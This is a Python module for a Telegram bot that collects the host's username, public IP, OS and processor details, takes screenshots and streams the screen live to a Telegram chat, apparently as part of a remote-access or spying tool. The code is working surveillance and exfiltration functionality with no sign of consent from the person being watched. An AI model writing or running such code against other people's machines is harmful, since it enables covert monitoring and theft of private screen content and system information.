import os, requests, platform, time
import mss
import mss.tools
from telebot import types, apihelper
def pc_info(message, user_id, bot):
    username = os.getlogin()
    r = requests.get('https://ip.42.pl/raw')
    user_ip = r.text
    system_name = platform.platform()
    processor = platform.processor()
    os_version = platform.version()
    bot.send_message(user_id,
                     "Name: " + username
                     + "\nIP: " + user_ip
                     + "\nOS: " + system_name
                     + "\nProcessor: " + processor
                     + "\nOS version: " + os_version)


def get_screenshot(message, user_id, bot):
    with mss.mss() as sct:
        monitor = sct.monitors[1]  # Use the 1st monitor
        im = sct.grab(monitor)  # Grab the picture
        raw_screenshot = mss.tools.to_png(im.rgb, im.size)
        msg = bot.send_photo(user_id, raw_screenshot)
    return msg


def streaming(message, user_id, bot):
    msg = get_screenshot(message, user_id, bot)
    try:
        bot.send_message(user_id, 'Type time period of streaming in seconds')
        bot.register_next_step_handler(message, self_updated_stream, user_id, bot, msg)
    except apihelper.ApiException as telebot_error:
        if telebot_error.result.status_code == 400:
            bot.send_message(user_id, 'Start stream again')


def self_updated_stream(message, user_id, bot, msg):
    t = 0

    while t < int(message.text):
        try:

            with mss.mss() as sct:
                monitor = sct.monitors[1]  # Use the 1st monitor
                im = sct.grab(monitor)  # Grab the picture
                raw_screenshot = mss.tools.to_png(im.rgb, im.size)
            bot.edit_message_media(media=types.InputMedia(type='photo', media=raw_screenshot),
                                   chat_id=user_id,
                                   message_id=msg.id,)
            time.sleep(1)
        except apihelper.ApiException as telebot_error:
            if telebot_error.result.status_code == 400:
                time.sleep(1)
        t += 1

        # bot.send_message(user_id, 'No activity on stream, start stream again')
    bot.send_message(user_id, 'Stream ended')
